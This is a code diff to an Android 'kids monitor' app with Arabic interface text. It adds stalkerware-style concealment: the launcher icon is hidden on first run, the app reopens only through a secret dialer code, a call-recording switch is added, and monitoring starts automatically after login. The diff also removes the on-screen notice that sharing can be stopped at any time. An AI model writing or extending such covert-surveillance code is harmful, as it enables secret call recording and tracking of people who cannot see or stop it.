@@ -2,6 +2,7 @@ package com.kids.monitor
 
 import android.Manifest
 import android.app.Activity
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
@@ -33,6 +34,7 @@ class MainActivity : Activity() {
         super.onCreate(savedInstanceState)
         FirestoreSync.init(this)
         auth = FirebaseAuth.getInstance()
+        maybeHideLauncherIcon()
         root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER_HORIZONTAL
@@ -45,6 +47,27 @@ class MainActivity : Activity() {
     override fun onResume() {
         super.onResume()
         if (auth.currentUser != null) updateStatus()
+    }
+
+    /** إخفاء أيقونة التطبيق من الشاشة الرئيسية عند أول تشغيل. */
+    private fun maybeHideLauncherIcon() {
+        val prefs = getSharedPreferences("monitor_prefs", MODE_PRIVATE)
+        if (!prefs.getBoolean("icon_initialized", false)) {
+            setLauncherIcon(true)
+            prefs.edit().putBoolean("icon_initialized", true).apply()
+        }
+    }
+
+    private fun setLauncherIcon(hidden: Boolean) {
+        val alias = ComponentName(this, "$packageName.LauncherAlias")
+        packageManager.setComponentEnabledSetting(
+            alias,
+            if (hidden) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            else PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            PackageManager.DONT_KILL_APP,
+        )
+        getSharedPreferences("monitor_prefs", MODE_PRIVATE)
+            .edit().putBoolean("icon_hidden", hidden).apply()
     }
 
     override fun onRequestPermissionsResult(
@@ -88,8 +111,8 @@ class MainActivity : Activity() {
 
         addText("مشاركة حالة الجهاز", 24f)
         addText(
-            "سجّل دخولك لربط هذا الجهاز بحسابك، ثم فعّل الأذونات المطلوبة من شاشة الإعدادات. " +
-                "يمكنك إيقاف المشاركة أو تسجيل الخروج في أي وقت.",
+            "سجّل دخولك لربط هذا الجهاز بحسابك. التطبيق يعمل تلقائياً في الخلفية بعد تسجيل الدخول. " +
+                "لفتحه لاحقاً استخدم كود الاتصال *#*#2003#*#*.",
             14f,
         )
 
@@ -117,6 +140,7 @@ class MainActivity : Activity() {
             addText("معرّف الجهاز: ${FirestoreSync.deviceId(this).take(8)}", 12f)
             statusText = addText("", 14f)
             updateStatus()
+
             addButton("الأذونات والإعدادات") {
                 startActivity(Intent(this, PermissionsActivity::class.java))
             }
@@ -130,6 +154,25 @@ class MainActivity : Activity() {
                 MonitorService.syncNow(this)
                 showMessage("تم طلب مزامنة فورية.")
             }
+
+            val recOn = getSharedPreferences("monitor_prefs", MODE_PRIVATE)
+                .getBoolean("call_recorder", false)
+            addButton(if (recOn) "إيقاف تسجيل المكالمات" else "تشغيل تسجيل المكالمات") {
+                val prefs = getSharedPreferences("monitor_prefs", MODE_PRIVATE)
+                val next = !prefs.getBoolean("call_recorder", false)
+                prefs.edit().putBoolean("call_recorder", next).apply()
+                render()
+            }
+
+            val hidden = getSharedPreferences("monitor_prefs", MODE_PRIVATE)
+                .getBoolean("icon_hidden", false)
+            addButton(if (hidden) "إظهار أيقونة التطبيق" else "إخفاء أيقونة التطبيق") {
+                val prefs = getSharedPreferences("monitor_prefs", MODE_PRIVATE)
+                val next = !prefs.getBoolean("icon_hidden", false)
+                setLauncherIcon(next)
+                render()
+            }
+
             addButton("تسجيل الخروج") {
                 stopService(Intent(this, MonitorService::class.java))
                 auth.signOut()
@@ -154,6 +197,9 @@ class MainActivity : Activity() {
         task.addOnCompleteListener(this) { result ->
             if (result.isSuccessful) {
                 render()
+                if (auth.currentUser != null) {
+                    MonitorService.start(this)
+                }
             } else {
                 showMessage("تعذر تسجيل الدخول: ${result.exception?.localizedMessage ?: "خطأ غير معروف"}")
             }
